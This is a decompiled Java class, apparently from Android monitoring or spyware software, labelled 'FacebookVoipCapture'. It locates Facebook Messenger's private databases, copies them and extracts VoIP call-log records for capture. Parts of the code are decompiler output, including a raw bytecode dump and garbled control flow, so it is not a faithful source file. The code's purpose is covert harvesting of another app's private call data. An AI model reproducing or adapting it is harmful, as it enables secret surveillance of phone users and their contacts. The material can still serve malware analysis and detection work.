package com.vvt.al.a;

import android.database.sqlite.SQLiteDatabase;
import android.os.SystemClock;
import com.vvt.ag.b;

public class c
  extends com.vvt.al.a
  implements com.vvt.al.c
{
  private static final boolean c = com.vvt.ak.a.a;
  private static final boolean d = com.vvt.ak.a.e;
  
  public c(String paramString1, String paramString2, com.vvt.h.d paramd, com.vvt.base.a parama)
  {
    super(paramString1, paramString2, parama);
  }
  
  private com.vvt.im.events.info.d a(SQLiteDatabase paramSQLiteDatabase)
  {
    boolean bool1 = c;
    if (bool1) {}
    com.vvt.im.events.info.d locald = com.vvt.capture.b.a.a.a(c(), "com.facebook.orca", paramSQLiteDatabase);
    String str = locald.b();
    boolean bool2 = b.a(str);
    if (bool2)
    {
      bool1 = false;
      locald = null;
    }
    for (;;)
    {
      bool2 = c;
      if (bool2) {}
      return locald;
      bool2 = c;
      if (!bool2) {}
    }
  }
  
  /* Error */
  private void a(String paramString1, String paramString2, String paramString3)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 4
    //   3: getstatic 16	com/vvt/al/a/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   6: istore 5
    //   8: iload 5
    //   10: ifeq +3 -> 13
    //   13: bipush 17
    //   15: istore 5
    //   17: iload 5
    //   19: aload_2
    //   20: invokestatic 51	com/vvt/p/MyUncaughtExceptionHandler:a	(ILjava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   23: astore 6
    //   25: aload 6
    //   27: ifnull +200 -> 227
    //   30: bipush 17
    //   32: istore 5
    //   34: iload 5
    //   36: aload_3
    //   37: invokestatic 51	com/vvt/p/MyUncaughtExceptionHandler:a	(ILjava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   40: astore 7
    //   42: aload 7
    //   44: ifnull +463 -> 507
    //   47: aload_0
    //   48: aload 7
    //   50: invokespecial 54	com/vvt/al/a/MyUncaughtExceptionHandler:a	(Landroid/database/sqlite/SQLiteDatabase;)Lcom/vvt/im/events/info/d;
    //   53: astore 8
    //   55: aload 8
    //   57: ifnull +444 -> 501
    //   60: invokestatic 58	com/vvt/capture/removeFromPath/MyUncaughtExceptionHandler/a/removeFromPath:a	()Ljava/lang/String;
    //   63: astore 9
    //   65: aconst_null
    //   66: astore 10
    //   68: aload 6
    //   70: aload 9
    //   72: aconst_null
    //   73: invokevirtual 64	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   76: astore 10
    //   78: aload 10
    //   80: ifnull +138 -> 218
    //   83: aload 6
    //   85: aload 10
    //   87: invokestatic 67	com/vvt/capture/removeFromPath/MyUncaughtExceptionHandler/a/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Landroid/database/Cursor;)Ljava/util/ArrayList;
    //   90: astore 9
    //   92: aload 9
    //   94: invokevirtual 73	java/util/ArrayList:size	()I
    //   97: istore 11
    //   99: iload 11
    //   101: ifle +107 -> 208
    //   104: iconst_0
    //   105: istore 11
    //   107: aload 9
    //   109: iconst_0
    //   110: invokevirtual 77	java/util/ArrayList:get	(I)Ljava/lang/Object;
    //   113: astore 9
    //   115: aload 9
    //   117: checkcast 79	com/vvt/capture/removeFromPath/a
    //   120: astore 9
    //   122: aload 9
    //   124: astore 4
    //   126: aload 6
    //   128: ifnull +8 -> 136
    //   131: aload 6
    //   133: invokevirtual 83	android/database/sqlite/SQLiteDatabase:close	()V
    //   136: aload 7
    //   138: ifnull +8 -> 146
    //   141: aload 7
    //   143: invokevirtual 83	android/database/sqlite/SQLiteDatabase:close	()V
    //   146: aload 10
    //   148: ifnull +10 -> 158
    //   151: aload 10
    //   153: invokeinterface 86 1 0
    //   158: aload 4
    //   160: ifnull +37 -> 197
    //   163: aload 8
    //   165: ifnull +32 -> 197
    //   168: aload_0
    //   169: aload 4
    //   171: invokevirtual 89	com/vvt/al/a/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/info/ICallLogData;)Z
    //   174: istore 5
    //   176: iload 5
    //   178: ifeq +183 -> 361
    //   181: getstatic 95	com/vvt/events/FxVoipCategory:FACEBOOK	Lcom/vvt/events/FxVoipCategory;
    //   184: astore 9
    //   186: aload_0
    //   187: aload_1
    //   188: aload 4
    //   190: aload 8
    //   192: aload 9
    //   194: invokevirtual 98	com/vvt/al/a/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/info/ICallLogData;Lcom/vvt/im/events/info/d;Lcom/vvt/events/FxVoipCategory;)V
    //   197: getstatic 16	com/vvt/al/a/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   200: istore 5
    //   202: iload 5
    //   204: ifeq +3 -> 207
    //   207: return
    //   208: getstatic 21	com/vvt/al/a/MyUncaughtExceptionHandler:d	Z
    //   211: istore 5
    //   213: iload 5
    //   215: ifeq +3 -> 218
    //   218: iconst_0
    //   219: istore 5
    //   221: aconst_null
    //   222: astore 9
    //   224: goto -102 -> 122
    //   227: getstatic 21	com/vvt/al/a/MyUncaughtExceptionHandler:d	Z
    //   230: istore 5
    //   232: iload 5
    //   234: ifeq +3 -> 237
    //   237: aconst_null
    //   238: astore 8
    //   240: aconst_null
    //   241: astore 10
    //   243: aconst_null
    //   244: astore 7
    //   246: goto -120 -> 126
    //   249: astore 9
    //   251: iconst_0
    //   252: istore 5
    //   254: aconst_null
    //   255: astore 9
    //   257: aconst_null
    //   258: astore 8
    //   260: aconst_null
    //   261: astore 10
    //   263: aconst_null
    //   264: astore 7
    //   266: getstatic 21	com/vvt/al/a/MyUncaughtExceptionHandler:d	Z
    //   269: istore 12
    //   271: iload 12
    //   273: ifeq +3 -> 276
    //   276: aload 7
    //   278: ifnull +8 -> 286
    //   281: aload 7
    //   283: invokevirtual 83	android/database/sqlite/SQLiteDatabase:close	()V
    //   286: aload 10
    //   288: ifnull +8 -> 296
    //   291: aload 10
    //   293: invokevirtual 83	android/database/sqlite/SQLiteDatabase:close	()V
    //   296: aload 8
    //   298: ifnull +10 -> 308
    //   301: aload 8
    //   303: invokeinterface 86 1 0
    //   308: aload 9
    //   310: astore 8
    //   312: goto -154 -> 158
    //   315: astore 9
    //   317: aconst_null
    //   318: astore 7
    //   320: iconst_0
    //   321: istore 12
    //   323: aconst_null
    //   324: astore 6
    //   326: aload 6
    //   328: ifnull +8 -> 336
    //   331: aload 6
    //   333: invokevirtual 83	android/database/sqlite/SQLiteDatabase:close	()V
    //   336: aload 7
    //   338: ifnull +8 -> 346
    //   341: aload 7
    //   343: invokevirtual 83	android/database/sqlite/SQLiteDatabase:close	()V
    //   346: aload 4
    //   348: ifnull +10 -> 358
    //   351: aload 4
    //   353: invokeinterface 86 1 0
    //   358: aload 9
    //   360: athrow
    //   361: getstatic 16	com/vvt/al/a/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   364: istore 5
    //   366: iload 5
    //   368: ifeq +3 -> 371
    //   371: aload_1
    //   372: invokestatic 104	com/vvt/shell/ShellUtil:i	(Ljava/lang/String;)V
    //   375: goto -178 -> 197
    //   378: astore 9
    //   380: aconst_null
    //   381: astore 7
    //   383: goto -57 -> 326
    //   386: astore 9
    //   388: goto -62 -> 326
    //   391: astore 9
    //   393: aload 10
    //   395: astore 4
    //   397: goto -71 -> 326
    //   400: astore 9
    //   402: aload 8
    //   404: astore 4
    //   406: aload 7
    //   408: astore 6
    //   410: aload 10
    //   412: astore 7
    //   414: goto -88 -> 326
    //   417: astore 9
    //   419: iconst_0
    //   420: istore 5
    //   422: aconst_null
    //   423: astore 9
    //   425: aconst_null
    //   426: astore 8
    //   428: aconst_null
    //   429: astore 10
    //   431: aload 6
    //   433: astore 7
    //   435: goto -169 -> 266
    //   438: astore 9
    //   440: iconst_0
    //   441: istore 5
    //   443: aconst_null
    //   444: astore 9
    //   446: aconst_null
    //   447: astore 8
    //   449: aload 7
    //   451: astore 10
    //   453: aload 6
    //   455: astore 7
    //   457: goto -191 -> 266
    //   460: astore 9
    //   462: aload 8
    //   464: astore 9
    //   466: aload 7
    //   468: astore 10
    //   470: aconst_null
    //   471: astore 8
    //   473: aload 6
    //   475: astore 7
    //   477: goto -211 -> 266
    //   480: astore 9
    //   482: aload 8
    //   484: astore 9
    //   486: aload 10
    //   488: astore 8
    //   490: aload 7
    //   492: astore 10
    //   494: aload 6
    //   496: astore 7
    //   498: goto -232 -> 266
    //   501: aconst_null
    //   502: astore 10
    //   504: goto -378 -> 126
    //   507: aconst_null
    //   508: astore 8
    //   510: aconst_null
    //   511: astore 10
    //   513: goto -387 -> 126
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	516	0	this	MyUncaughtExceptionHandler
    //   0	516	1	paramString1	String
    //   0	516	2	paramString2	String
    //   0	516	3	paramString3	String
    //   1	404	4	localObject1	Object
    //   6	3	5	bool1	boolean
    //   15	20	5	i	int
    //   174	268	5	bool2	boolean
    //   23	472	6	localObject2	Object
    //   40	457	7	localObject3	Object
    //   53	456	8	localObject4	Object
    //   63	160	9	localObject5	Object
    //   249	1	9	localException1	Exception
    //   255	54	9	localObject6	Object
    //   315	44	9	localObject7	Object
    //   378	1	9	localObject8	Object
    //   386	1	9	localObject9	Object
    //   391	1	9	localObject10	Object
    //   400	1	9	localObject11	Object
    //   417	1	9	localException2	Exception
    //   423	1	9	localObject12	Object
    //   438	1	9	localException3	Exception
    //   444	1	9	localObject13	Object
    //   460	1	9	localException4	Exception
    //   464	1	9	localObject14	Object
    //   480	1	9	localException5	Exception
    //   484	1	9	localObject15	Object
    //   66	446	10	localObject16	Object
    //   97	9	11	j	int
    //   269	53	12	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   19	23	249	java/lang/Exception
    //   19	23	315	finally
    //   36	40	378	finally
    //   227	230	378	finally
    //   48	53	386	finally
    //   60	63	386	finally
    //   72	76	386	finally
    //   85	90	391	finally
    //   92	97	391	finally
    //   109	113	391	finally
    //   115	120	391	finally
    //   208	211	391	finally
    //   266	269	400	finally
    //   36	40	417	java/lang/Exception
    //   227	230	417	java/lang/Exception
    //   48	53	438	java/lang/Exception
    //   60	63	460	java/lang/Exception
    //   72	76	460	java/lang/Exception
    //   85	90	480	java/lang/Exception
    //   92	97	480	java/lang/Exception
    //   109	113	480	java/lang/Exception
    //   115	120	480	java/lang/Exception
    //   208	211	480	java/lang/Exception
  }
  
  private e f()
  {
    boolean bool1 = true;
    boolean bool2 = c;
    if (bool2) {}
    e locale = new com/vvt/al/a/e;
    boolean bool3 = false;
    locale.<init>(this, null);
    String str1 = com.vvt.capture.b.a.a.a("com.facebook.orca");
    boolean bool4 = b.a(str1);
    if (!bool4)
    {
      String str2 = c();
      String str3 = e();
      String str4 = this.a;
      str1 = com.vvt.capture.b.b.e.a(str1, str2, str3, str4);
      if (str1 != null)
      {
        boolean bool5 = c;
        if (bool5) {}
        str4 = com.vvt.capture.b.b.e.a("com.facebook.orca");
        boolean bool6 = b.a(str4);
        if (!bool6)
        {
          int i = 2;
          Object[] arrayOfObject = new Object[i];
          arrayOfObject[0] = str4;
          arrayOfObject[bool1] = "prefs_db";
          str4 = String.format("%s/%s", arrayOfObject);
          String str5 = this.a;
          str2 = com.vvt.capture.b.b.e.a(str4, str2, str3, str5);
          boolean bool7 = b.a(str2);
          if (!bool7)
          {
            bool7 = c;
            if (bool7) {}
            locale.a = bool1;
            locale.b = str1;
            locale.c = str2;
          }
        }
      }
    }
    for (;;)
    {
      bool3 = c;
      if (bool3) {}
      return locale;
      bool3 = d;
      if (bool3)
      {
        continue;
        locale.a = false;
        bool3 = d;
        if (bool3)
        {
          continue;
          bool3 = d;
          if (bool3) {}
          locale.a = false;
          continue;
          bool3 = d;
          if (bool3) {}
          locale.a = false;
        }
      }
    }
  }
  
  public String a()
  {
    return "facebook_line";
  }
  
  public void a(String paramString, long paramLong)
  {
    boolean bool1 = c;
    if (bool1) {}
    bool1 = c;
    if (bool1) {}
    long l = 10000L;
    SystemClock.sleep(l);
    Object localObject = f();
    boolean bool2 = ((e)localObject).a;
    if (bool2)
    {
      String str = ((e)localObject).b;
      localObject = ((e)localObject).c;
      a(paramString, str, (String)localObject);
    }
    d();
    bool1 = c;
    if (bool1) {}
  }
  
  public String b()
  {
    return "FacebookVoipCapture";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */